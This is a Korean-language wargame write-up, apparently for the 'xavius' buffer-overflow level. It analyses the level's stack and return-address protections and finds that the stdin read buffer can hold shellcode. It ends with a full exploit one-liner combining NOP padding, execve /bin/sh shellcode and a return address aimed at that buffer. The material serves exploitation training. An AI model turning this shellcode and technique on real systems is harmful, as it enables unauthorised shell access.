'''
1.버퍼의 크기 40
2.fgets로 256만큼 입력
3.buf[1][47]에 '\xbf','\x08' 사용X -> 스택영역이나 코드영역 사용X
4.ret_addr으로 라이브러리를 사용하지 못하게 함
 ->라이브러리의 끝에 항상 leave와 ret이 존재하기 때문에 라이브러리를 사용 못하게 함.
 ->while(memcpy(ret_addr, "\x90\x90",2)!=0)
   {
	if(*ret_addr =='\xc9'){
		if(*(ret_addr+1)=='\xc3'){
			exit(0);
		}
	}
	ret_addr++;
   }
  => leave값을 확인 결과( x/x 0x8048829 = 0x9090c3c9)
     ret값을 확인 결과( x/x 0x804882a = 0x909090c3)
     인 것을 확인 할수 있었다. 모든 라이브러리는 leave와 ret을 사용하기 때문에 라이브러리 사용불가.

5.memset으로 ret영역을 제외한 스택영역을 모두 0으로 초기화

----------------------------------------------------------------------------------

* 이 문제는 argv를 이용하지 않고, stdin을 이용함
-> stdin을 이용할 경우 우리가 키보드로 입력한 값들이 버퍼에 저장이 됨. 즉, 우리가 입력한 놈은 어딘가 메모리에 저장 된다.



* strace ./xavius 
->fstat(0으로 시작-입력)와 old_mmap 부분을 보고 0x40015000이 read위치 인 것을 알 수 있음

=> 시스템 콜 read는 기본적으로 임시 버퍼를 가지고 있다. 그리고 gets와 fgets 같은 
포장함수는 내부에서 시스템 콜 read를 호출하기 때문에 결과적으로 read와 동일하게
임시 버퍼를 가짐.

- 이것을 활용하여 공격을 가능할 것 같다.
(python - c 'print "\x90"*(40-len("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
))+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"abcd"+"\x00\x50\x01\x40";cat)|./xavius


'''






